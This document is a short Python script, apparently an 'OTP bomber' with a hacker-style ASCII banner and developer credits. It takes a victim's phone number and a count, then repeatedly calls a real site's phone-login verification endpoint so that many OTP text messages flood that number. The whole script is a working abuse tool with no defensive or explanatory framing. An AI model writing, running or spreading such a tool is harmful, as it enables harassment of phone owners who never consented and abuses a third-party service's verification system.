import requests
import time
import os

# হ্যাকার স্টাইল ব্যানার
os.system('cls' if os.name == 'nt' else 'clear')
print("\033[1;32m")  # সবুজ রঙ
print("=" * 60)
print("███████╗██████╗  █████╗ ██╗██╗")
print("██╔════╝██╔══██╗██╔══██╗██║██║")
print("█████╗  ██████╔╝███████║██║██║")
print("██╔══╝  ██╔═══╝ ██╔══██║██║██║")
print("██║     ██║     ██║  ██║██║███████╗")
print("╚═╝     ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝")
print("                Powered by SBAI")
print("=" * 60)
print("\n")

# তথ্য বক্স
print("╔═══════════════════════════════════════════════════╗")
print("║        Developer By Salman Ahmed                  ║")
print("║        Facebook: https://facebook.com/salman.dev  ║")
print("║        GitHub:   https://github.com/salmanbhai    ║")
print("║        YouTube:  https://youtube.com/@salmantech  ║")
print("╚═══════════════════════════════════════════════════╝")
print("\n")

# ইউজার ইনপুট
phone_number = input("Enter phone number: ")
count = int(input("How many OTPs to send?: "))

# API URL
url_template = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={}"

# হেডার
headers = {
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'application/json',
}

# OTP পাঠানোর লুপ
for i in range(count):
    response = requests.get(url_template.format(phone_number), headers=headers)
    print(f"[{i+1}] Status: {response.status_code}, Response: {response.text}")
    time.sleep(1)
